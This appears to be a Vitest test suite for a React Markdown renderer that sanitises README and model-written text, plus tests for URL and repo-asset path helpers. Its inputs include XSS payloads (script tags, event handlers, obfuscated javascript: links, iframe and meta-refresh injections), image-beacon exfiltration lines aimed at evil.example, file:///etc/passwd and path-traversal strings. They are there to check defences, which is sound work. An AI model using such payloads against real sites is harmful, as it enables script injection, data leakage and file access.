import { renderToStaticMarkup } from "react-dom/server";
import { describe, expect, it } from "vitest";
import { MarkdownBody } from "../src/components/markdown-body";
import { imageDimension, usableImageUrl } from "../src/lib/markdown";
import { repoAssetUrl } from "../src/lib/repo-asset";

/** The rendered HTML without the `<div class="markdown">` wrapper, so attribute checks see only the README's content. */
function render(markdown: string, props: { untrusted?: boolean; resolveImage?: (src: string) => string | null } = {}): string {
  const html = renderToStaticMarkup(<MarkdownBody {...props}>{markdown}</MarkdownBody>);
  return html.replace(/^<div class="markdown">/, "").replace(/<\/div>$/, "");
}

/** Every attribute name on every tag in `html`, so a test can say "no onerror anywhere" without tripping on text. */
function attributeNames(html: string): string[] {
  const names: string[] = [];
  for (const [, tag] of html.matchAll(/<[a-z][^\s>/]*((?:\s+[^\s=>/]+(?:="[^"]*")?)*)\s*\/?>/gi)) {
    const withoutValues = (tag ?? "").replace(/="[^"]*"/g, "");
    names.push(...withoutValues.split(/\s+/).filter(Boolean));
  }
  return names;
}

describe("MarkdownBody: Markdown", () => {
  it("still renders GFM: headings, tables, task lists, code and strikethrough", () => {
    const html = render(
      ["# Title", "", "| a | b |", "| - | - |", "| 1 | 2 |", "", "- [x] done", "- [ ] todo", "", "```js", "let x = 1;", "```", "", "~~gone~~"].join("\n"),
    );
    expect(html).toContain("<h1>Title</h1>");
    expect(html).toContain("<table>");
    expect(html).toMatch(/<input[^>]*type="checkbox"[^>]*disabled/);
    expect(html).toContain('class="language-js"');
    expect(html).toContain("<del>gone</del>");
  });

  it("makes absolute http(s) links live and opens them safely", () => {
    const html = render("[docs](https://example.com/docs)");
    expect(html).toContain('<a href="https://example.com/docs" target="_blank" rel="noopener noreferrer">docs</a>');
  });

  it("shows relative and fragment links as text with a hint, never as links", () => {
    const html = render("[guide](docs/guide.md) and [top](#top)");
    expect(html).not.toContain("<a ");
    expect(html).not.toContain("href=");
    expect(html).toContain("<span title=\"Not a web link, so it isn&#x27;t clickable here\">guide</span>");
    expect(html).toContain(">top</span>");
  });
});

describe("MarkdownBody: raw HTML in a README", () => {
  it("renders the HTML READMEs actually use: centered blocks, sized images, line breaks", () => {
    const html = render(
      [
        '<p align="center">',
        '  <img src="https://example.com/logo.png" width="200" height="80" alt="Logo" title="The logo">',
        "  <br>",
        "  <b>Tagline</b>",
        "</p>",
        "",
        '<h1 align="center">Centered</h1>',
      ].join("\n"),
    );
    expect(html).toContain('<p align="center">');
    expect(html).toContain('src="https://example.com/logo.png"');
    expect(html).toContain('width="200"');
    expect(html).toContain('height="80"');
    expect(html).toContain('alt="Logo"');
    expect(html).toContain('title="The logo"');
    expect(html).toContain('loading="lazy"');
    expect(html).toContain('referrerPolicy="no-referrer"');
    expect(html).toContain("<br/>");
    expect(html).toContain("<b>Tagline</b>");
    expect(html).toContain('<h1 align="center">Centered</h1>');
  });

  it("renders details/summary, kbd, sub/sup and HTML tables", () => {
    const html = render(
      [
        "<details><summary>More</summary>",
        "",
        "Hidden **bold** text",
        "",
        "</details>",
        "",
        "Press <kbd>Ctrl</kbd>+<kbd>C</kbd>, H<sub>2</sub>O, x<sup>2</sup>",
        "",
        '<table><tr><th align="left">A</th><td colspan="2">B</td></tr></table>',
      ].join("\n"),
    );
    expect(html).toContain("<details><summary>More</summary>");
    expect(html).toContain("<strong>bold</strong>");
    expect(html).toContain("<kbd>Ctrl</kbd>");
    expect(html).toContain("<sub>2</sub>");
    expect(html).toContain("<sup>2</sup>");
    // React turns a table cell's align into the equivalent style, so it is the renderer, not the README, writing it.
    expect(html).toContain('<th style="text-align:left">A</th>');
    expect(html).toContain('<td colSpan="2">B</td>');
  });

  it("keeps a badge inside a link", () => {
    const html = render('<a href="https://ci.example.com"><img src="https://img.shields.io/x.svg" alt="build"></a>');
    expect(html).toContain('<a href="https://ci.example.com" target="_blank" rel="noopener noreferrer"><img src="https://img.shields.io/x.svg"');
  });

  it("shows only the <img> of a <picture>; its <source> (and srcset) is dropped", () => {
    const html = render(
      '<picture><source media="(prefers-color-scheme: dark)" srcset="https://evil.example/track.png"><img src="https://example.com/light.png" alt="logo"></picture>',
    );
    expect(html).not.toContain("<source");
    expect(html).not.toContain("srcset");
    expect(html).not.toContain("evil.example");
    expect(html).toContain('src="https://example.com/light.png"');
  });

  it("drops HTML comments", () => {
    const html = render("before <!-- <img src=\"https://evil.example/x.png\"> secret --> after");
    expect(html).not.toContain("evil.example");
    expect(html).not.toContain("secret");
    expect(html).toContain("before");
    expect(html).toContain("after");
  });

  it("passes only sane image dimensions on", () => {
    const html = render(
      '<img src="https://example.com/a.png" width="javascript:1" height="99999999"><img src="https://example.com/b.png" width="50%" height="-3">',
    );
    expect(html).not.toContain("javascript");
    expect(html).not.toContain("99999999");
    expect(html).toContain('width="50%"');
    expect(html).not.toContain('height="-3"');
  });
});

describe("MarkdownBody: hostile HTML", () => {
  it("drops script elements with their contents", () => {
    const html = render("a<script>alert(1)</script>b <script src=\"https://evil.example/x.js\"></script>");
    expect(html).not.toMatch(/script/i);
    expect(html).not.toContain("alert");
    expect(html).not.toContain("evil.example");
  });

  it("drops <style> blocks without printing their CSS", () => {
    const html = render("<style>body { display: none }</style>hello");
    expect(html).not.toMatch(/<style/i);
    expect(html).not.toContain("display");
    expect(html).toContain("hello");
  });

  it("removes event handlers, style and class attributes", () => {
    const html = render(
      '<img src="https://example.com/a.png" onerror="alert(1)" onload="alert(2)" style="position:fixed" class="x">\n\n<p onclick="alert(3)" style="color:red" class="y">text</p>',
    );
    expect(html).not.toMatch(/alert/i);
    for (const forbidden of ["onerror", "onload", "onclick", "style", "class"]) {
      expect(attributeNames(html)).not.toContain(forbidden);
    }
    expect(html).toContain("<p>text</p>");
  });

  it.each([
    ["javascript:", '<a href="javascript:alert(1)">x</a>'],
    ["mixed case", '<a href="JaVaScRiPt:alert(1)">x</a>'],
    ["leading whitespace", '<a href="  javascript:alert(1)">x</a>'],
    ["an embedded tab", '<a href="java\tscript:alert(1)">x</a>'],
    ["an entity", '<a href="&#106;avascript:alert(1)">x</a>'],
    ["data:", '<a href="data:text/html,<script>alert(1)</script>">x</a>'],
    ["vbscript:", '<a href="vbscript:msgbox(1)">x</a>'],
    ["Markdown syntax", "[x](javascript:alert(1))"],
    ["an autolink-style reference", "[x][r]\n\n[r]: javascript:alert(1)"],
  ])("never links to %s", (_name, markdown) => {
    const html = render(markdown);
    expect(html).not.toMatch(/javascript|vbscript|data:text|href=/i);
    expect(html).not.toContain("alert");
    expect(html).toContain(">x</span>");
  });

  it.each([
    ["an iframe", '<iframe src="https://evil.example/"></iframe>', "iframe"],
    ["an iframe with fallback text", "<iframe>fallback leak</iframe>", "fallback leak"],
    ["an object", '<object data="https://evil.example/x.swf"></object>', "object"],
    ["an embed", '<embed src="https://evil.example/x.swf">', "embed"],
    ["a form", '<form action="https://evil.example/"><input name="q"><button>go</button></form>', "form"],
    ["a text input", '<input type="text" name="q">', "<input"],
    ["a video", '<video src="https://evil.example/v.mp4" autoplay></video>', "video"],
    ["an audio element", '<audio src="https://evil.example/a.mp3" autoplay></audio>', "audio"],
    ["inline svg", '<svg onload="alert(1)"><circle r="1"/><text>svg leak</text></svg>', "svg leak"],
    ["math", "<math><mi>m</mi></math>", "<math"],
    ["a link element", '<link rel="stylesheet" href="https://evil.example/x.css">', "<link"],
    ["a meta refresh", '<meta http-equiv="refresh" content="0;url=https://evil.example">', "<meta"],
    ["a base element", '<base href="https://evil.example/">', "<base"],
    ["a template", "<template><img src=\"https://evil.example/x.png\">template leak</template>", "template leak"],
    ["a noscript", "<noscript><img src=\"https://evil.example/x.png\"></noscript>", "evil.example"],
  ])("does not render %s", (_name, markdown, forbidden) => {
    const html = render(markdown);
    expect(html).not.toContain(forbidden);
    expect(html).not.toContain("evil.example");
  });

  it.each([
    ["protocol-relative", '<img src="//evil.example/p.png" alt="pixel">'],
    ["data:", '<img src="data:image/svg+xml;base64,PHN2Zy8+" alt="pixel">'],
    ["javascript:", '<img src="javascript:alert(1)" alt="pixel">'],
    ["file:", '<img src="file:///etc/passwd" alt="pixel">'],
    ["Markdown protocol-relative", "![pixel](//evil.example/p.png)"],
  ])("does not load a %s image", (_name, markdown) => {
    const html = render(markdown);
    expect(html).not.toContain("<img");
    expect(html).not.toContain("evil.example");
    expect(html).toContain("[pixel]");
  });

  it("prefixes ids and names so a README can't shadow the page's own", () => {
    const html = render('<div id="root">a</div>\n\n<h2 id="__next">b</h2>');
    expect(html).not.toMatch(/id="root"|id="__next"/);
    expect(html).toContain('id="user-content-root"');
    expect(html).toContain('id="user-content-__next"');
  });

  it("keeps attribute-breaking text inside the attribute, and survives unbalanced tags", () => {
    const html = render('<img src="https://example.com/a.png" alt="x\' onerror=\'alert(1)"><div><p>unclosed <b>bold');
    // The payload is only alt text; it must not have become an attribute of its own.
    expect(html).toContain('alt="x&#x27; onerror=&#x27;alert(1)"');
    expect(attributeNames(html)).not.toContain("onerror");
    expect(html).toContain("unclosed <b>bold</b>");
  });

  it("keeps task-list checkboxes but not a stray <input>", () => {
    expect(render("- [x] done")).toMatch(/<input[^>]*type="checkbox"/);
    expect(render('<input type="text" name="q" value="x">')).not.toContain("<input");
    expect(render('<input type="checkbox" checked> loose')).not.toContain("<input");
  });
});

describe("MarkdownBody: relative images", () => {
  it("shows [alt] for a relative image when nothing resolves it", () => {
    expect(render("![diagram](docs/diagram.png)")).toContain("[diagram]");
    expect(render('<img src="docs/diagram.png" alt="diagram">')).not.toContain("<img");
  });

  it("loads a relative image from the URL the resolver gives, in Markdown and in HTML", () => {
    const resolveImage = (src: string) => `/api/repo-asset?path=${encodeURIComponent(src)}`;
    const markdown = render("![diagram](docs/diagram.png)", { resolveImage });
    expect(markdown).toContain('src="/api/repo-asset?path=docs%2Fdiagram.png"');
    const html = render('<img src="logo.png" width="64" alt="logo">', { resolveImage });
    expect(html).toContain('src="/api/repo-asset?path=logo.png"');
    expect(html).toContain('width="64"');
  });

  it("does not hand absolute URLs to the resolver", () => {
    const seen: string[] = [];
    render("![a](https://example.com/a.png)", { resolveImage: (src) => (seen.push(src), null) });
    expect(seen).toEqual([]);
  });

  it("falls back to [alt] when the resolver has no answer", () => {
    expect(render("![diagram](../outside.png)", { resolveImage: () => null })).toContain("[diagram]");
  });

  it.each([
    ["javascript:", "javascript:alert(1)"],
    ["data:", "data:image/png;base64,AAAA"],
    ["protocol-relative", "//evil.example/p.png"],
    ["empty", ""],
  ])("ignores a resolver answer that is %s", (_name, answer) => {
    const html = render("![diagram](docs/diagram.png)", { resolveImage: () => answer });
    expect(html).not.toContain("<img");
    expect(html).toContain("[diagram]");
  });

  it("accepts a resolver answer that is an http(s) URL or a same-origin path", () => {
    expect(render("![d](x.png)", { resolveImage: () => "https://raw.example.com/x.png" })).toContain('src="https://raw.example.com/x.png"');
    expect(render("![d](x.png)", { resolveImage: () => "/api/repo-asset?path=x.png" })).toContain('src="/api/repo-asset?path=x.png"');
  });
});

describe("MarkdownBody: untrusted text (written by a model)", () => {
  it("never loads an image, from Markdown or from HTML, whatever the resolver says", () => {
    const resolveImage = () => "/api/repo-asset?path=x.png";
    for (const markdown of [
      "![secret](https://evil.example/leak?q=conversation)",
      '<img src="https://evil.example/leak?q=conversation" alt="secret">',
      "![rel](docs/x.png)",
    ]) {
      const html = render(markdown, { untrusted: true, resolveImage });
      expect(html).not.toContain("<img");
      expect(html).not.toContain("evil.example");
    }
    expect(render("![secret](https://evil.example/x.png)", { untrusted: true })).toContain("[image: secret]");
  });

  it("drops raw HTML instead of rendering it", () => {
    const html = render('before <b>bold</b> <p align="center">centered</p> <details><summary>s</summary>d</details> after', { untrusted: true });
    expect(html).not.toMatch(/<b>|align=|<details|<summary/);
    expect(html).toContain("before");
    expect(html).toContain("after");
  });

  it("shows where a link goes and marks it nofollow", () => {
    const html = render("[docs](https://example.com/docs)", { untrusted: true });
    expect(html).toContain('href="https://example.com/docs"');
    expect(html).toContain('title="https://example.com/docs"');
    expect(html).toContain("noopener noreferrer nofollow");
  });

  it("does not make a relative or script link clickable", () => {
    const html = render("[a](docs/x.md) [b](javascript:alert(1))", { untrusted: true });
    expect(html).not.toContain("href=");
    expect(html).not.toContain("javascript");
  });
});

describe("imageDimension", () => {
  it.each([
    [200, 200],
    ["200", 200],
    [" 64 ", 64],
    ["200px", 200],
    ["50%", "50%"],
    ["100%", "100%"],
  ])("accepts %j", (input, expected) => expect(imageDimension(input)).toBe(expected));

  it.each([0, -1, 1.5, 10_001, "0", "-3", "101%", "10001", "1e3", "abc", "100vw", "calc(1px)", "", null, undefined, {}, NaN])(
    "rejects %j",
    (input) => expect(imageDimension(input)).toBeUndefined(),
  );
});

describe("usableImageUrl", () => {
  it("allows http(s) URLs and same-origin paths only", () => {
    expect(usableImageUrl("https://example.com/x.png")).toBe("https://example.com/x.png");
    expect(usableImageUrl("HTTP://example.com/x.png")).toBe("HTTP://example.com/x.png");
    expect(usableImageUrl("/api/repo-asset?x=1")).toBe("/api/repo-asset?x=1");
    for (const bad of ["//evil.example/x.png", "javascript:alert(1)", "data:image/png;base64,AA", "docs/x.png", "", null, undefined]) {
      expect(usableImageUrl(bad)).toBeNull();
    }
  });
});

describe("repoAssetUrl", () => {
  const url = (src: string, repo = "work/app") => repoAssetUrl(repo, src);
  const path = (src: string) => new URL(url(src)!, "http://localhost").searchParams.get("path");

  it("points a relative path at the asset route, with the repo and path as query parameters", () => {
    const parsed = new URL(url("docs/logo.png", "work/my app")!, "http://localhost");
    expect(parsed.pathname).toBe("/api/repo-asset");
    expect(parsed.searchParams.get("repo")).toBe("work/my app");
    expect(parsed.searchParams.get("path")).toBe("docs/logo.png");
  });

  it.each([
    ["logo.png", "logo.png"],
    ["./logo.png", "logo.png"],
    ["/logo.png", "logo.png"],
    ["././docs//img/./logo.png", "docs/img/logo.png"],
    ["docs/logo.png?raw=true", "docs/logo.png"],
    ["docs/logo.png#frag", "docs/logo.png"],
    ["docs/my%20logo.png", "docs/my logo.png"],
    ["  docs/logo.png  ", "docs/logo.png"],
    ["docs/%252e%252e/x.png", "docs/%2e%2e/x.png"],
  ])("normalises %j to %j", (src, expected) => expect(path(src)).toBe(expected));

  it.each([
    ["a parent directory", "../secret.png"],
    ["a parent directory after a folder", "docs/../../secret.png"],
    ["an encoded parent directory", "%2e%2e/secret.png"],
    ["a mixed-case encoded parent directory", "docs/%2E%2E/%2e%2E/secret.png"],
    ["an https URL", "https://example.com/logo.png"],
    ["a data URL", "data:image/png;base64,AAAA"],
    ["a javascript URL", "javascript:alert(1)"],
    ["a file URL", "file:///etc/passwd.png"],
    ["a protocol-relative URL", "//evil.example/logo.png"],
    ["an empty string", ""],
    ["only a query", "?x=1"],
    ["only dots", "./."],
    ["a malformed escape", "docs/%E0%A4%A.png"],
  ])("refuses %s", (_name, src) => expect(url(src)).toBeNull());
});
